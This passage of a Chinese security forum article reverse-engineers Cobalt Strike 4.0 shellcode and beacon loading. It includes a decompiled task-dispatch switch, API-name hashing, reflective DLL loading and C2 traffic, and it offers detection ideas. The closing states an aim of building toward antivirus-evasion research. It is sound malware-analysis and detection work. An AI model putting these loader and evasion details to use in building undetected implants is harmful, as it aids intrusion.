![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-5c9cec3afb23302e9302e865e966dc82cc5990fa.png)

然后根据返回内容来执行对应命令：如下图，当某个响应内容的值大于0的时候调用8831这个偏移的函数：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-6bd25f8f42f8388df9ddb4661f33fc0a500aea03.png)

这个函数的实现如下：，其中有个8305的偏移的函数，这个函数就是在处理执行操作的类型，更具类型执行不同的命令：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-2425d9f5cee0e6fbadfa96f4e45bd251d9599ab3.png)

如下图，可以看到这个cobaltstrike4.0的beacon里面内置了100个任务类型：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f491803b536f31ee8d306df87f894077c99cad3d.png)

根据响应内容来判断调用不同形式命令，常见的什么截图、弹窗、代理等相关命令之类的

```php
​  
      switch ( a3 )  
  {  
    case 1:  
      v3 = 1;  
      goto LABEL\_3;  
    case 3:  
      return (void \*)sub\_100021AE(Src);  
    case 4:  
      return (void \*)sub\_10002231(Src, result);  
    case 5:  
      return (void \*)sub\_100021C2(result);  
    case 9:  
      return (void \*)sub\_100043D4(1);  
    case 10:  
      return (void \*)sub\_100026BA((int)result, Src, "wb");  
    case 11:  
      return (void \*)sub\_10003ACE(result, Src);  
    case 12:  
      return (void \*)sub\_10002269(result);  
    case 13:  
      return (void \*)sub\_10009D53(result, Src, 1);  
    case 14:  
      return (void \*)sub\_10006FC6(result, Src);  
    case 15:  
      return (void \*)sub\_100071D2(Src);  
    case 16:  
      return (void \*)sub\_10007214(Src);  
    case 17:  
      return (void \*)sub\_10006F72(result);  
    case 18:  
      return (void \*)sub\_1000477E(Src, 1);  
    case 19:  
      return (void \*)sub\_10003D0C(Src);  
    case 22:  
      return (void \*)sub\_100062FE(Src);  
    case 23:  
      return (void \*)sub\_10006445(Src);  
    case 24:  
      return (void \*)sub\_100062BD(Src);  
    case 27:  
      return (void \*)sub\_1000A2A2(Src);  
    case 28:  
      return (void \*)sub\_1000A16F(Src);  
    case 29:  
      return (void \*)sub\_1000274D(result, Src);  
    case 31:  
      return (void \*)sub\_1000A371(result, Src);  
    case 32:  
      return (void \*)sub\_1000894E(result, Src);  
    case 33:  
      return (void \*)sub\_10008886(Src, result);  
    case 37:  
      return (void \*)sub\_10007714(result);  
    case 38:  
      return (void \*)sub\_1000243C(result, Src);  
    case 39:  
      return (void \*)sub\_100028D4(Src);  
    case 40:  
    case 62:  
      return (void \*)sub\_10005F7A(result, Src);  
    case 41:  
      return (void \*)sub\_100060AA(Src);  
    case 42:  
      return (void \*)sub\_10006112(Src, result);  
    case 43:  
      return (void \*)sub\_100043D4(0);  
    case 44:  
      v4 = 1;  
      goto LABEL\_40;  
    case 45:  
      return (void \*)sub\_100047C9(Src, 1);  
    case 46:  
      return (void \*)sub\_100047C9(Src, 0);  
    case 47:  
      return (void \*)sub\_10002938(Src, result);  
    case 48:  
      return (void \*)sub\_1000589B(result, Src);  
    case 49:  
      return (void \*)sub\_1000A5D8(result, Src);  
    case 50:  
      return (void \*)sub\_10007616(Src, result);  
    case 51:  
      return (void \*)sub\_100076C0(Src, result);  
    case 52:  
      return (void \*)sub\_100029DA(result, Src);  
    case 53:  
      return (void \*)sub\_10003FD1(result, Src);  
    case 54:  
      return (void \*)sub\_10003EAA(Src, result);  
    case 55:  
      return (void \*)sub\_10003DA1(Src, result);  
    case 56:  
      return (void \*)sub\_10003E68(Src, result);  
    case 57:  
      return (void \*)sub\_10002A92(result, Src);  
    case 58:  
      return (void \*)sub\_10002C10(result, Src);  
    case 59:  
      return (void \*)sub\_1000A8BD(Src, result);  
    case 60:  
      return (void \*)sub\_10002FE8(result);  
    case 61:  
      return (void \*)sub\_10003075(Src);  
    case 67:  
      return (void \*)sub\_100026BA((int)result, Src, "ab");  
    case 68:  
      return (void \*)sub\_1000660C((LPCSTR)result);  
    case 69:  
      return (void \*)sub\_10009D53(result, Src, 0);  
    case 70:  
      v5 = 1;  
      goto LABEL\_63;  
    case 71:  
      v6 = 1;  
      goto LABEL\_65;  
    case 72:  
      return (void \*)sub\_10002212(result);  
    case 73:  
      return (void \*)sub\_10003ED3(result, Src);  
    case 74:  
      return (void \*)sub\_10003F53(result, Src);  
    case 75:  
      return (void \*)sub\_10007A4A(Src, result);  
    case 76:  
      return (void \*)sub\_1000233F(result, Src);  
    case 77:  
      return (void \*)sub\_10003154(result, Src);  
    case 78:  
      return (void \*)sub\_100025C9(result, Src);  
    case 79:  
      return (void \*)sub\_1000774D(Src, result);  
    case 80:  
      return (void \*)sub\_1000499E(Src, result);  
    case 81:  
      return (void \*)sub\_100097FC(result, Src);  
    case 82:  
      return (void \*)sub\_1000766B(Src, result);  
    case 83:  
      return (void \*)sub\_10001092(result, Src);  
    case 84:  
      return (void \*)sub\_10001130(Src);  
    case 85:  
      return (void \*)sub\_100011D5(Src);  
    case 86:  
      return (void \*)sub\_1000695C(result, Src);  
    case 87:  
      v5 = 0;  
LABEL\_63:  
      result = (void \*)sub\_10004903(result, Src, 1, v5);  
      break;  
    case 88:  
      v6 = 0;  
LABEL\_65:  
      result = (void \*)sub\_10004903(result, Src, 0, v6);  
      break;  
    case 89:  
      v3 = 0;  
LABEL\_3:  
      result = (void \*)sub\_10004475(result, Src, 1, v3);  
      break;  
    case 90:  
      v4 = 0;  
LABEL\_40:  
      result = (void \*)sub\_10004475(result, Src, 0, v4);  
      break;  
    case 91:  
      result = (void \*)sub\_1000477E(Src, 0);  
      break;  
    case 92:  
      result = (void \*)sub\_10007966(Src, result);  
      break;  
    case 93:  
      result = (void \*)sub\_100046AD(result, Src, 1);  
      break;  
    case 94:  
      result = (void \*)sub\_100046AD(result, Src, 0);  
      break;  
    case 95:  
      result = (void \*)sub\_1000585E(Src, result);  
      break;  
    case 96:  
      result = (void \*)sub\_100045C7(1);  
      break;  
    case 97:  
      result = (void \*)sub\_100045C7(0);  
      break;  
    case 98:  
      result = (void \*)sub\_10004520(1);  
      break;  
    case 99:  
      result = (void \*)sub\_10004520(0);  
      break;  
    default:  
      return result;  
  }
```

0x03 相关
=======

一、上文中用来提炼函数名和模块名生成特征码使用的算法
--------------------------

笔者理解这里之所以要存在这个算法，主要是两个作用：

1、缩短shellcode的长度，有些函数名以及模块名比较长，如果直接写到shellcode里面我们要使用像下面这种位置无关代码，这样就会占比较长位置（shellcode越短越好，因为在一些系统溢出漏洞中对内存空间的大小限制是非常严格的）。

```php
char szMessageBoxA\[\] = { 'M','e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
```

机器码的存储形式是，如下图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ce5bd67ba86c3516fc61ec69f6d68792c7555bba.png)

2、对抗静态分析把，如果直接出现一些函数名，模块名在里面，特征太明显了。（但是其实算法后的特定值之后也会被作为静态分析的特征）

二、关于windows在rang3，如何从fs寄存器中拿到模块基址的这个过程
--------------------------------------

上文这里没有详细写，如果想具体了解，可以参考笔者之前写的文章：

<https://forum.butian.net/share/1934>

中的shellcode编写部分的内容，如下图，这里面有详细讲：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-13d072194c79810e20fc142df141eb5ffb4f4035.png)

三、检测思路:
-------

笔者了解到目前已有的对上述shellcode加载过程的检测：

### 1、流量侧

1、拉取beacon文件的时候，可以检测到发起的请求，这个请求满足算法checksum8（），返回文件很大，20000个字节左右。

2、我们可以去对beacon文件里面的内容做检测，因为这里beacon文件加密方式就是和一个密钥异或，并且密钥也是在beacon里面的，解密出来之后我们就可以看到pe文件的全貌了，这是一种检测思路

3、执行反射加载的dll里面dllmain方法的时候，触发c2客户端逻辑，发起心跳流量和命令执行流量，心跳流量请求的uri（http/https隧道的）、元数据传输字段，主要由生成shellcode的时候对应cs的c2profile文件控制。

4、当是https隧道的时候，因为TLS在建立连接的时候要发送证书，这里可以通过一些cs默认的证书去检测（当然如果更换证书了，这里就检测不了了）；除此之外，笔者之前看了一篇文章，说这个c2server在和beacon利用TLS协议建立连接的时候，c2server端发送的一些内容是有特征的，能检测。

### 2、主机侧

笔者看github上有个beaconeyes的项目，这个项目检测的是主机内存空间，将进程的内存dump下来，去判断我们上面说的dllmain初始化逻辑里面还原出来的一些数据，通过这些数据的通用形式来匹配。

还有一些查杀技术，比如专门针对shellcode的检测，在r3检测是否存在通过fs获取模块基址的行为；再比如专门对抗检测反射dll加载的查杀技术，对开辟空间进行检查，检测是否存在动态加载dll的过程等

0x04 总结
=======

一、过程
----

简单总结下cs的shellcode的思路：

1、执行shellcode，shellcode会通过fs寄存器获取内存模块加载表，从而从kernel32模块里面获取loadlibrary的地址，来加载wininet这个模块，加载之后从这个模块里面找到一些网络连接要用的函数（如，InternetConnectA，HttpSendRequestA等等），通过调用这些函数，向cobaltstrike的c2 server拉取beacon文件，并执行。

2、执行beacon，对其中部分数据进行解密，还原出来一个pe文件，并执行。

3、执行pe文件头部，通过dos头引导，执行pe文件里面的reflectiveloader函数，reflectiveloader函数里面主要实现：

- 通过3环fs寄存器那套，找到kernel模块里面我们要用的几个函数（GetProcessAddress、GetModuleHandleA、LoadLibraryA、LoadLibraryExA、VirtualAlloc、VirtualProtect）
- 通过找到的函数，实现对dll本身的加载（1、将pe从文件格式映射到内存格式；2、修复导入表 3、修复重定位表 4、运行dllmian（初始化））

4、dos引导的最后也是会调用从reflectiveLoader函数里面返回的dllmain函数，dllmain里面实现c2客户端的通信逻辑，发送心跳，执行命令等

对cs的shellcode进行研究分析还是比较有价值的，能为后续我们对免杀技术手段的研究打一个夯实的基础。